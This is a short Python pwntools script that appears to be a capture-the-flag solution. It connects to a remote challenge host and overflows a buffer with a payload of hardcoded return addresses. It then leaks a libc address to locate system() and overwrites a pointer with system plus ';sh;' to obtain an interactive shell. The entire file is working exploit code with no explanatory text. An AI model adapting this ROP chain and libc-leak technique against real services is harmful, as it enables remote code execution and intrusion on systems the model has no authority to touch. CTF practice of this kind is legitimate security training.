from pwn import *
import time

HOST, PORT = '0.0.0.0', 6501
HOST, PORT = 'c0ffee.svattt.org', 31334

r = remote(HOST, PORT)

r.sendline('1')

for i in range(10):
	r.recvuntil('size>')
	r.sendline('1'.ljust(8, 'a'))
	time.sleep(0.2)
	r.send('a')
	r.recvuntil('>> ')
	r.sendline('1')
	r.recvuntil('> ')
	r.sendline('yes')

payload = 'a' * 16 + p32(0) + p32(0x80485f0) + p32(0x8048549) + p32(0x804b010) + p32(0x8048570) + p32(0x8048570) + p32(0) + p32(0x804b010) + p32(8)

r.recvuntil('size>')
r.sendline(str(len(payload)))
time.sleep(0.2)
r.send(payload)
r.recvuntil('>> ')
r.sendline('4141')
r.recvuntil('> ')
r.sendline('no')

for i in range(2):
	r.recvuntil('001\n')
data = r.recvline()[:-1][:4].ljust(4, '\x00')
read = u32(data)
libc = read - 0xd5980
system = libc + 0x3ada0

r.send(p32(system) + ';sh;')

r.interactive()